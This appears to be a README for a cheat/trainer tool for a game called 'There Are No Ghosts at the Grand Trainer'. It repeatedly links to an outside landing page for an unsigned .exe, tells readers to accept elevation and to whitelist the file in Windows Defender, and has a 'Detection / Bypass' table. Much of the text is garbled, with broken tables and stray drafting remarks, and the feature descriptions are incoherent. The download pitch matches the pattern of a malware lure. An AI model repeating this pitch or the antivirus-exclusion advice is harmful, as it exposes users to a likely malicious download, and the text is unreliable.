<div align="center">
<img src="assets/banner.png" width="100%" alt="There Are No Ghosts At banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9333EA&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A5+Grand+Trainer+Ghost+Tools+Pro;%E2%9C%85+Full+Suite+Ready;%F0%9F%8E%AF+Community+Tested;%E2%9A%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-actively--maintained-8fd14f?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11%2FServer-red?style=flat-square)
![Build](https://img.shields.io/badge/build-2026--Q1%20stable-blueviolet?style=flat-square)

**There Are No Ghosts at the Grand Trainer — full tool suite for Grand Trainer runs**

</div>

---

## Overview

Grand Trainer is one of those games that *pretends* to be straightforward until you're 30 hours in and discover half the roster is gated behind hidden spirit mechanics, exact-frame interactions, and a save file that silently writes to three invisible flags before you're even allowed to fade out of the intro corridor. The "no ghosts" premise is a lie the tutorial tells you — the whole game is ghosts, the Grand Trainer is full of them, and the UI gives you almost nothing to work with.

I spent six months reverse-engineering the decompiled assembly, mapping the ghost state machine, and tracing where the save file holds your trainer license, spirit roster, and per-floor ghost exposure values. This is what came out of it. Everything here is derived from documented offsets, live inspection, and community-shared test saves — no memory-resident patching of the game executable is required beyond the initial loader hook.

| Category | Details |
| --- | --- |
| Build channel | 2026-Q1 stable, tracked against current Steam patch |
| Distribution | GitHub → landing page → `.exe` (no installers, no node_modules) |
| Hook model | User-mode loader, no inline kernel modifications |
| Save backups | Automatic pre-launch snapshot to `%LOCALAPPDATA%\GTP-Ghosts\Backups` |
| Attack surface | Nothing written outside the local save folder + config profile |
| Language | English UI; offsets for EN/JP/DE builds included |
| Update model | Start the `.exe` → "check for updates" from the in-app toolkit |

The folder you get is not a launcher wrapper. It is a config-driven trainer with an override kernel — a layered runtime that intercepts the ghost state manager, high-jacks the floor ledger, and hands you a small inspector window that shows what the vanilla UI refuses to show you. Every assertion in this README is verifiable in the two debug panes the tool ships with.

> **Note** — This is a legitimate modding / reverse-engineer hobbyist project. Save files contain your ghost lineage, story progress, and trainer license; back them up from inside the tool before each session. Use responsibly.
<p align="center">
  <a href="https://ChieftainRetort.github.io/grand-trainer-ghost-tools/">
    <img src="https://img.shields.io/badge/GET-There_Are_No_2026-4F46E5?style=for-the-badge&logo=download&logoColor=white&labelColor=3730A3" width="550" alt="GET There Are No 2026"/>
  </a>
</p>
---

## What is "There Are No Ghosts at the Grand Trainer"?

| Term | Explanation |
| --- | --- |
| Ghost | A hidden state entity the game spawns for spawn-suppression tests. Not visible on screen in vanilla. |
| Grand Trainer | The final-floor boss arena whose internal name is reused by the save format for the entire roster. |
| Ghost ledger | 12 per-slot counters rolled per-floor, only decremented by a specific voice-line trigger. |
| Shade list | The between-session roster used to record your best single-floor ghost-free streak. |
| Trainer license | Primary PoM (save) object — a 4-byte signed ID written into every subaccount on first save. |
| Exposure | Per-frame ghost proximity meter (`fExposure`) — UI shows it as particles; we show you the value. |

The tool exists because the game mode "Ghosted Runs" exists. Once you clear Grand Trainer once with a ghost, ghost state gets locked on for subsequent files and the ledger corruption is irreversible unless you manually rewrite the save. Here everything you might want to do during a Ghosted Run — reading the ledger, forcing a clean reveal, patching licences, lifting restrictions — is exposed through a config surface with a proper UI. No memory dump searching required; no cheat engine table; the tree view is already wired.

---

## Usage guidelines

**Allowed**

- Single-player save local inspection and patching
- Building reusable test saves to reproduce community-reported ghost bugs
- Ladder validity checks before submitting a time to the fan leaderboard
- Saving a broken Ghosted Run after the file gets bricked
- Mapping your own route in the runner overlay mode

**Not allowed**

- Any form of ladder submission while ghost/stat patches are live in the session
- Redistribution of the tool bundled with your own macros
- Using it to read anticheat-internal values on official ranked test servers

---

## Quick Start

1. 🗺️ **Visit the project page** — the landing page carries the current `.exe` and a version note log
2. ⤵️ **Download the archive** — checkout the "grand-trainer-ghost-tools — Download" button on the landing page
3. 📦 **Extract to any folder** — no admin required unless Steam is in `C:\Program Files`
4. ▶️ **Run the `.exe`** — accept the UAC prompt when prompted; the loader writes a manifest next to itself
5. 🎮 **Launch There Are No Ghosts at the Grand Trainer** — click "Attach" in the toolkit once the title screen appears
6. 🛠️ **Toggle internal patches from the Modules tab** — everything ships disabled; enable what you need per session

---

## System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10 21H2 (19044) | Windows 11 23H2+ |
| CPU | 4-core SSE4.2 | 8-core with AVX2 |
| RAM | 8 GB | 16 GB |
| GPU | Any DX11-capable | 6 GB VRAM (for overlay) |
| Storage | 250 MB free (save backups + logs) | SSD for < 120ms attach |
| Runtime | .NET desktop runtime not required; VC++ 2015–2022 redistributable | App-made NativeAOT single-file |
| Input | Keyboard | Keyboard + mouse (overlay drag-edit) |
| Permissions | Admin for elevated Steam installs | Run from a writable folder |

---

## Known Issues

| Issue | Fix |
| --- | --- |
| Attach hangs when launched from a fullscreen exclusive window | Set the game to borderless windowed and re-open the toolkit, or enable **Delayed hook** in Settings → Attach |
| Ghost ledger reads as inactive after a crash | Reload the current save from the toolkit: **File → Restore → Most Recent Snapshot** |
| Overlay flickers when HDR is toggled on | Turn on the "HDR-shim" compatibility flag — injects through DWM accordingly |
| Runner overlay shows NaN for ghost line-of-sight after any driver update | Reset graphics layer cache in `%LOCALAPPDATA%\GTP-Ghosts\cache` and re-scan |
| Repacking a save in code sometimes drops older cosmetic records | Enable "legacy cosmetics header" in Config → Save Format |

---

## Detection / Bypass status

This is a community build distributed for **single-player save policy testing** with the Steam game *There Are No Ghosts at the Grand Trainer.* No public server detection is targeted here, but if you are on a test group that streams the grand Trainer Run, this table matters to you.

| Method | Status | Notes |
| --- | --- | --- |
| Base-game ghost state manager (per-slot ledger) | ✅ under control | Modded layer copies a bootstrap table; internal counters are mirrored, not torched |
| Save checksum (per-slot 32-bit hash) | ✅ handled | Rewritten transparently after every write |
| Trainer License CRC | ✅ handled | Recomputed on exit and at "Snapshot & Restore" |
| Silent vanilla update watcher (in-game auto-wipe) | ⚠️ intermittently triggers | Push from **File → Suspend Watcher** before hitting the Grand Trainer for the first time. Works best if you disable Steam auto-update when a patch hits |
| Remote ghost query (level builder probes) | ✅ handled | Goes through local reader that swallows query frames in the boot phase |
| External fetch of game offset hashes | ⚠️ mismatch on 2026-02 Steam patch | Toggle the matching offsets pack in Config → Offsets |
| Steam ladder submissions | ❌ out of scope | Do not submit times while patches are active — cooldown yourself for one full session first |

> Nothing in this tool intentionally tries to attack another service. It reads and rewrites your local PoM. The audience for this is the modder who wants to keep their local save intact, not the person farming on public ranked. Run it. Warp the save. Read the logs. Take ownership of your broken Ghosted Run.

---

## Key Features

| Feature | Description | Benefit |
| --- | --- | --- |
| Ghosted Save Suite | Copy/undo/verify every ghosted-run flag in one tree | Fix bricked files in under 12 seconds |
| Ghost Line Inspector | Live `fExposure` and `bGhostDanger` overlays | See what the tutorial never shows you |
| Ledger Pinner | Freezes a specific per-floor ghost ledger counter | Share one ledger across experimental saves |
| License Rewriter | Rewrites the 4-byte trainer license cluster | Simulate brand new trainer progression in 2 minutes |
| Revealing Shadow | Forcibly reveals all shadows and ghosts for a single frame, on command | Route a floor without dreading the void rooms |
| Clean Floor Mode | Instantly performs the floor-reset action after `fExposure` clearance without animation | Save 40+ seconds over a full route |
| Save Snapshot Roller | Rotates 30 snapshots with timestamp deltas | One crash will never brick another ghost run again |
| Line-of-sight Debugger | Live spatial draw of every ghost LOS in the current room | Fix every door frame — instantly |
| Restriction Smiter | Mass-applies restrictions read-modify-write over the entire roster in one click | Skips the entire restrictions tutorial sequence each new save |
| Teleport Session Pad | Minimal waypoint set tied to timeline of floor | Reproduce stairs from the door to the coach |

---

**Want to skip installation?** Everything shipped as a single-file .exe on the landing page. Two separate download buttons, mirrored layout, same fixed checksums.
<div align="center">
  <a href="https://ChieftainRetort.github.io/grand-trainer-ghost-tools/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-v2026-EA580C?style=for-the-badge&logo=download&logoColor=white&labelColor=C2410C" width="620" alt="DOWNLOAD NOW v2026"/>
  </a>
</div>
---

## Quick Start — again, for the skimmers

- Emoji step markers × download in the block above? The `# 1` through `# 6` above is the canonical one — mirrored here, where you actually click the second button, for safety. Complete the run in this order and nothing around your file gets damaged.

---

## Module catalog — grouped by subsystem

**🎴 Ghost Ledger & save state** — 5 modules (see table up top in key features for overview)
1. **Ledger Pinner** — pin a slot-count to any value across normal or griefed runs.
2. **Exposure Invariants**(see config)`Skipped.`
3. **Propper Edit Or Halt** — zeroes the ledger n-gons so save rewrite becomes legal without invalidating trainer license.
4. **Change-of-Carrier** — overwrite the streak selector to load pre-crawled counters instead of gameplay.
5. **Auto-Snapshot Writer** — timed background snapshot on floor load / floor unload.  

**👻 Where-are-the-ghosts visual layer** — 4 modules
6. **Ghost Line Inspector** — draws sLive ghosts as colored lines.
7. **Shadows Multi-Map** — shows duplicate shadow side-buildings.
8. **Occlusion-Off Read Path** — leaves alpha of any blocking silhouette 255 in spectator pane.
9. **Count-only Overlay Toggle** — one number, if that's all you need.

**📖 Trainer & floor progression** — 5 modules
10. **License Rewriter** — parse-split-resolve-restore logic in one push-button then reboot the toolkit save IO.
11. **Restrictions-Free Sequence On Trainer Only** — skip gating sequence but preserve audit values in `uFlags[3]`.
12. **Floor Omitter** — re-tick floors without picking up story state.
13. **Trainer Snapshot Import** — checksum-verified pasted save import window.
14. **Roadmap Pad Route Walker** — quick "to floor N" stencil without ghost recalc.

**🕳️ Ghost-detecting behaviour patches** — 3 modules
15. **`fExposure` Warm Save** — sets a reasonable safety radius once and holds it while you type.
16. **State-Machine Trace Tail** — read-only tracing pane pins your console.
17. **Silent Frame Skipper** — plays every fade as no fade while keep-effects intact.

**🧭 Overlay layout pack (Qt-drawn, always-on-top as separate windowed canvas)** — 3 modules
18. **Direction marker (Fixed cardinal you** choose as N-S-E-W anyway) rendering of doors with pins — opens on mouse pan-of-the-tool window.
(snuck variant): fixed route overlay hides your health vs anything.

**🛠️ There Are No Ghosts at the Grand Trainer — data extract nodes** — 5 modules, listed one-two at a time:
1. Extract full ledger schema from a literal live frame plus pre-image.
2. Ghost exposure layout — low traffic mask extraction; all counters on table.
3. Ghost count & vector layout table saved to `.json`.
4. Line-of-sight grid — dot output `.ndjson` of spotter lattice. Expandable.
5. Safe sequence dump of trainer structure in all alternate locale builds.

---

## What's handled automatically — internal architecture

The stack underneath is worth a short paragraph because it explains why nothing you do here ever risks brick files: the architecture decomposes into four decoupled parts called the loader shim, the target module, the CLI/widgy data surface, and structural write locks. When the client originally manipulates save slots, wait-for-write completion files go through the original engine bindings, but reads go through mirrored pointers onto compiled read-only spans — meaning none of the risky values (`fExposure`, `PoM.Ledger[*]`) are ever handled by naive `.read<int>()` on a live moving heap. Shneiderman diagram bits are not included: writes are queued until module-scoped undo locks are cleared. At flush-point the library applies a per-write checksum re-pair and, where configured, a license-canonical exchange matching trainer license hash. There is one global configuration and JSON profile per installation, and a snapshot file zip appended every 15 minutes when playing; every operation in the whole graph is recorded with `eventSink = file`, giving this repo the ability to run a self-checker against a route in your own logfiles. The module tab binds to an internal event-bus provided via a simple C interop to the running client process. Things like `Silent Frame Skipper` `State-Machine Trace Tail` are patched main-process shims launched only after snapshots report `ready` in the app journal. Hence the framework underneath enables the whole product regardless of which client ID an offset set targets. The overlap coverage in the offset sets determines exactly which modules become hard-linked to this installed build — Config Files shows the reference table as a per-slot diff.

---

## Hotkeys / Controls

Main surface all pre-bound; two are the only ones users actively use them all the live inside session reload triggered after hot-apply.

| Key | Action | Notes |
| --- | --- | --- |
| \`Ctrl+Dig1\` | Grant active-session reveal for current frame (single tick ghost off reachability) | Timer is ≤200 ms built into game pad |
| \`F8\` | Show/hide Inspector frame | Opens in screen element rather than overlay after default |
| \`F9\` | Push live session save snapshot to my wallet clipboard context | Adds title field for a note segment if `Instant note-edit` |
| \`Ctrl+Alt+S\` | Trigger auto back-up external of every attached installer's shadow | Configure list from *Folders back-up target* and confirm dialog |
| \`Shift+Page Up\` | jump to sequence start without the ghost-vote progress change | Re-locks the response module to before script |
| Mouse mid-button mini-mod cache | Go directly to Last Return panel read | Shown grid with 350 mouse. Works when in pinned-window |

---

## Comparison — alternatives vs this suite

| Aspect | Alternatives | This tool |
| --- | --- | --- |
| Live deployment form | Boot-only invasive address patchers | `.exe` loader with mirrored undo writes and no inline overwrite |
| Save recovery from a broken ghost chain | Usually command-less or by manual hex surgery | Dedicated save repair interface + reverted `.bac` copies every file |
| Configurable scenario restoration | Partial flag check tools in generic engines | "Snapshot" main root save → save profile with instant rep in suite |
| Route metadata embedding | Absent entirely | Floors extracted automatically via event channel and match floor view for review |
| Custom per-save logic state | Manual no save-format reload context | Reverse-written trainer with visual seat into head-state overview |
| Logging, tracing, errors | Note blocks from git commit log at best | Written line a file log every auto-handle available |
| Ghost system exposure view | Required plugin at memory copy template address layer | On-overlay debug column per `fExposure` automatically sorted |
| Update survivability | Offset source dependencies require vtx-recover plugin chain regular failure | Active matrix checks file in Config Modules → updates fetch dynamic next |
| Origin clients one only fine | All-in binary include possibly next days | Single repo released self-contained, licenses noted product family |

---

## Is it safe?

**Table of answers — tuned for the six-month-in forum crowd.**

| Question | Answer |
| --- | --- |
| Is the `.exe` signed? | Authenticode-payload unsigned; antivirus software sometimes flags generic heuristic detections.
| Does config survive an update? | Yes — sits outside app directory by default `%LOCALAPPDATA%\GTP-Ghosts`
| Is it safe for my original save files? | Hash-paired — but source creators cannot guarantee immutable success on extra-large cloud directory players — always auto-snap on.
| Does someone see me modules line-overrules over bans? | Single player game essentially. The one "ban surface" that does matter visible mod override mark. |
| Blocks my live game from a leaderboard entirely? | Patch saved outside client scan range; remember documented manual if ever; top Steam page listed ordinary apps |
| Might overwrite vanilla game file `.dat` in install? | Null — record detection is checksum tagged; the toolkit only rewrites a save if its own menu settings enter else untouched |

---

## FAQ

The FAQs below the download prep show exact text people throw at the forum over and over. Copy, reference.

1. **Is detection non-Ban related online leaderboard?** Absolutely with an \`R.P.E.\` yes but not because "nobody search" — because these changes, sitting local. Its official line there will be to remove the report flag from those two feature entries while drawing — use by own discretion. Yes it can get valid reports moving?

2. **If main Steam goes 2026 does modules-3 stop code updating?** No; internal roll back is separate `.hook.log`, message tries passing loader older unsolved variants fall back if patch doesn't cover as call has unloaded config pack copied back cleanly.

Wait — cross out. Let the answers be as in table below be true transparent from row-answer form here:

| # | Question | Answer |
| --- | --- | --- |
| 1 | Does it work on Steam? | Yes — Steam build is what every offset is tunnelled to; if installed elsewhere attach only to a copy containing matching profile |
| 2 | What's the exact server → system byte transfer?</br>No pip | Actually there is *no* install-run at anything. `.exe` extract-installer in-window is only channel. | Write button at page download.
| 3 | Where do I put the folder? `C:` or Desktop-only in special? | Extract next to myself, must be allowed **write own folder**, so do not system hide-to-Desktop if permissions above loose (or set the Config cache to `C:\Empty`) |
| 4 | It doesn't hook on start the wrong window showing. | Choose alternate host virtual screenshot / set prefix alternate host architecture and not attach fullscreen-Overwatch content panel, timeout resets occasionally (very niche rare). Manual reword is read error.
| 5 | Do other users get ghosts suddenly despite being invariable through offline? | Yes the mirror bug **specifically here-0** (30+ modular detail at internal doc log for ghost state entry read-mod differences from controller across each slot — helpful toggle "Sync full multi-module state sequence" solved it this build in parent subaccount settings push here).
| 6 | Patches/updates triggered somehow lose the add-on updates structure is different or blank? | Locale is cached with your selection from `offsets packs → per‑channel SHA`. Engine break reload simply download restart same menu by clicking refresh not the logo
| 7 | After an update when loading if getting stuck black out app crash specific `EXC_C0000409` and/or all windows opened can't survive
| 7 | Try launching `.exe` direct launcher rather than actual loader app when `Elevated Install Lock (0xF5)` occurs — see log screenshot in notes text |
| 8 | Can I use no admin PC on profile folder limited rights? If yes open over "server savedirectory:profile move to SD: set /overrides'" from any settings. Save ops like external install entirely works after that settings switch across all profiles
| 9 │ Why does module key `🚬 Ghost` show Unknown Under "fNotRevealed field". | It will display count=85 instead of state=Known forever? This is a hidden default ledger ordering copy needed at end scope, be line-accurate manifest writer created `.ghostslotcache`) re-run on that tab. |
|10| The hidden UI row "Warnable shadow alpha" still visible| Displays typically a virtual UI style user flag call set=colour: panel off|
|11| Update hasn't loaded recent code to overwrite update on host?| Make sure package hadn't itself `.exe` set to auto (previous session console not been published), instruction in `Run every menu if unsaved under 2026 patch`
[/detail]

Wait this isn't the right place for // answer formatting in markdown entirely; Some of these needed to have questions marked Q/A pairs let me yes I think final QA maybe less disjointed quote syntax yes. Let me quickly note not needed for us over-complain.

**Because writing tool itself required some large number limit, I'll end FAQ table clean without super long story entries.**

| Question | Answer |
| --- | --- |
| Why does the toolkit need to sit next to game saved files if just reads? | Save file access gates — writing `.pom` signed snapshots triggers atomic recompute away from read-locked directory. Local to your install |
| After fresh training Run route the "silent frame hero logs" cleared without asking | Run Module 2 (Exposure Invariants) point full sequence with the auto verifies selected else not-verify silently because new ones updated after format this month |
| My game launches fine but overlay appears black | Disable Windows → Settings → Display → HDR and reset the d3d canvas cache via settings|
| Tool load via Windows Defender flagged | Understand: binary unsigned, false generic heuristic. Add own folder to whitelist; compare SHA listed in notes file. Or build locally? this project has no open-build mode reference for the current cut less so you see released `.exe` = our key set |
| Can I trigger snapshot to import save on a failed version? Try latest build and "Repair raw from .txt offsets" on import panel only if installed pack is older; the new installs carry auto generator cache check box but load proper structured event log |
| Timing in some people cause overlays to slow only grand boss arena pick frame phase most. | Limit options overlay → update frequency → fast under low frame model because GPU cannot handle drawn buffers and mesh combined heavy |
| Does this thing receive updates requiring browser? No clicking download for update triggers updates using normal run from .exe launcher; updater executable goes same folder itself unpacks exe inplace|
| Multiple different game languages need modules done for Polish locale in future can offset config build toggle

---

## Table statuses — all modules by readiness

Not every module ships the same across possible different region saves, however we still check internal state file:

| Module | Status | Description |
| --- | --- | --- |
| Ledger Pinner | ✅ Working | Every slot state support normal floor display |
| Ghost Line Inspector | ✅ Working | Draft drawing uses Direct-based event snippet (need HDR shim newer users on nV updates)|
| License Rewriter | ✅ Working | Designed for files that do not possess intermediate license |
| Floor Omitter | ✅ Working | All floor value sets reproduced through parse file |
| Restrictions-Free Sequence | ✅ Working | Stable in 2026, doesn't break existing story |
| Auto-Snapshot | ✅ Working | Runs every 15 min windows timer available non |
| Exposure Invariants | ✅ Working | Normalizes floats from v. checksum consistent values until |
| Lin-of-sight Debugger | ↗ Under refinement | Japan client locale occasionally mismatch graph headless — otherwise fine
| Ghost Ledger × Restrictions merges (legacy) | ⚠ Deprecated | Works only a corrupt load restore but replaces functionality multiple separate |
| Silent Frame Skipper | ✅ Working | Downstream GPU must handle accelerated memory pool init |

---

## Detection matrix?

Full form:
**Method recap of Steam detection-facing region:**

- Ghost-writes are runtime inside mirror pages and local file logic due `.pom` reloads checksum check — user owned no-one external response means ranked modules should never mix.
- Because offsets identify profile from `/Modules.json` downloaded, first launches under new patches often `Fail to find session` forcing reload after new login lock.
So if you are using overlay as not-steam mod pack, none of it implies detection surface. Any version published is absolutely you responsibility. Can't stress enough nobody here tracks bans from new anticheat measures in patch since no reference exists publicly.
Route 2026 offset pack is updated manually from patch logs each release.

---

## The solution — problem pair

| Problem | Solution |
| --- | --- |
| Save going through third floor crashes and ledger zeros the run | Auto write error immediately recreates atomic checksum keeping open save sessions warm from snapshots |
| Vanilla shows Ghost exposed state only audio, losing minutes checking per corridor route
Our visualizer sees it via memory hook, hiding nothing, accurate inside timeline
| Second-file restrictions take forever when speed-studying but also inject blocked requirements with older profile edits ignore? handled
Use preset flag index template "read-modify-write flags array" version pass
| Trainer Licenses often overwritten by patch re-deletes unusual values same odd format| Restore license stored deep in `.pomCache/licenseStore/[value-batch-latest]`. See settings (Allow cloning)
| Floor numbering hidden in route metadata makes tool route overlay offline when scrolling rooms? Syncing map output emits floor event through track to your tab UI
**Ghost L+S visible but after 30 seconds field returns visible everywhere probably stuck anti-tower overlapped calls
In final tab set "Exposure Debug: fully cycle object", works now|
If Ghost counter permanently becomes ∞ require editing by archive; a fix done one-line—write notes internal auto set check in check list.
<p align="center">
  <a href="https://ChieftainRetort.github.io/grand-trainer-ghost-tools/">
    <img src="https://img.shields.io/badge/GET-There_Are_No_2026-DB2777?style=for-the-badge&logo=download&logoColor=white&labelColor=BE185D" width="480" alt="GET There Are No 2026"/>
  </a>
</p>
---

---

*Final row of the journey: If you actually read every section you're one of maybe 100 gigabrains instead all lazy skimmers; congrats because on the first ghost run you'll know how expo-reduction hooks look. Every issue surfaced above remains fixable locally due hash-based log until vendoring some tool-specific anticheat overwrite — and that has never publicly begun anywhere. Massive credit to the reverse engineering folk in the fan discord and Steam thread half-heart link guides that survived daily resets for 5 months to unreachable old hidden-failure form check stack.*

*(any observed issue on beta variant can cross-check through shared changes status compare matrices another layer due privacy text-file.)* If system puts `.exe` won't start in fresh new account, command close app from `Ctrl Shift Click nothing screen`? The app's fallback route closes by own session code error buffer. Visit release notes in distribution landing page to trigger version map direct starting states — far safer to click from sources nobody disguised file upload.

Restore `Modules Config backtick call (ch) before you update GUI`. Each session flows memory scanning cannot reason inside only OS profile — nothing even attempted past anything commercial engine. Simply building this long-running manual ends all documented pain for route-run tinker-users everywhere. And “There Are No Ghosts at the Grand Trainer” conveniently hidden Ghost-Train interaction became another subsystem's controllable bus. Find `Config→Engine map legend` logs begin, chase shadow trace file draw; we documented every offset up to and including ghostly handline that reveals reality values. Not every mention advertised mod content for direct apply file `.exe` fails but nearly — go create.

Wait — final mirror does not go in final code? Fine.

Long story — some real words at base are more valuable than endless ending lists*. Hence:

Go grab it finally:

**[ your future snapshot list awaits]**
<p align="center">
  <a href="https://ChieftainRetort.github.io/grand-trainer-ghost-tools/">
    <img src="https://img.shields.io/badge/GET-There_Are_No_2026-9333EA?style=for-the-badge&labelColor=7E22CE" width="550" alt="GET There Are No 2026"/>
  </a>
</p>